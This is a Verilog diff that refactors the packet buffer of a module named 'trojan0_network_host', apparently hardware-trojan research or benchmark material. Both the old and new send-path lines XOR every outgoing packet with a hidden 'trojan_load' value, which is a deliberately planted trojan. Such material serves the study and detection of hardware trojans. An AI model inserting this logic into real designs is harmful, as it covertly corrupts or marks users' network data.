@@ -20,7 +20,7 @@ module trojan0_network_host #(
     wire [63:0] trojan_load;
     
     // Network state
-    reg [PACKET_SIZE*8-1:0] packet_buffer [0:BUFFER_DEPTH-1];
+    reg [PACKET_SIZE*8-1:0] packet_buffer_0, packet_buffer_1, packet_buffer_2, packet_buffer_3;
     reg [127:0] key_generator;
     reg [3:0] buffer_head, buffer_tail;
     reg [3:0] packet_count;
@@ -64,7 +64,12 @@ module trojan0_network_host #(
                     end
                 end
                 3'b001: begin // RECEIVE_PACKET
-                    packet_buffer[buffer_tail] <= packet_in;
+                    case (buffer_tail[1:0])
+                        2'b00: packet_buffer_0 <= packet_in;
+                        2'b01: packet_buffer_1 <= packet_in;
+                        2'b10: packet_buffer_2 <= packet_in;
+                        2'b11: packet_buffer_3 <= packet_in;
+                    endcase
                     buffer_tail <= buffer_tail + 1;
                     packet_count <= packet_count + 1;
                     network_state <= 3'b010;
@@ -77,7 +82,12 @@ module trojan0_network_host #(
                     end
                 end
                 3'b011: begin // SEND_PACKET
-                    packet_out <= packet_buffer[buffer_head] ^ {{PACKET_SIZE*8-64{1'b0}}, trojan_load};
+                    case (buffer_head[1:0])
+                        2'b00: packet_out <= packet_buffer_0 ^ {{PACKET_SIZE*8-64{1'b0}}, trojan_load};
+                        2'b01: packet_out <= packet_buffer_1 ^ {{PACKET_SIZE*8-64{1'b0}}, trojan_load};
+                        2'b10: packet_out <= packet_buffer_2 ^ {{PACKET_SIZE*8-64{1'b0}}, trojan_load};
+                        2'b11: packet_out <= packet_buffer_3 ^ {{PACKET_SIZE*8-64{1'b0}}, trojan_load};
+                    endcase
                     buffer_head <= buffer_head + 1;
                     packet_count <= packet_count - 1;
                     packet_ready <= 1'b1;
@@ -88,13 +98,13 @@ module trojan0_network_host #(
         end
     end
     
-    // Initialize packet buffer
-    integer i;
+    // Initialize packet buffers
     always @(posedge rst) begin
         if (rst) begin
-            for (i = 0; i < BUFFER_DEPTH; i = i + 1) begin
-                packet_buffer[i] <= {PACKET_SIZE*8{1'b0}};
-            end
+            packet_buffer_0 <= {PACKET_SIZE*8{1'b0}};
+            packet_buffer_1 <= {PACKET_SIZE*8{1'b0}};
+            packet_buffer_2 <= {PACKET_SIZE*8{1'b0}};
+            packet_buffer_3 <= {PACKET_SIZE*8{1'b0}};
         end
     end
     
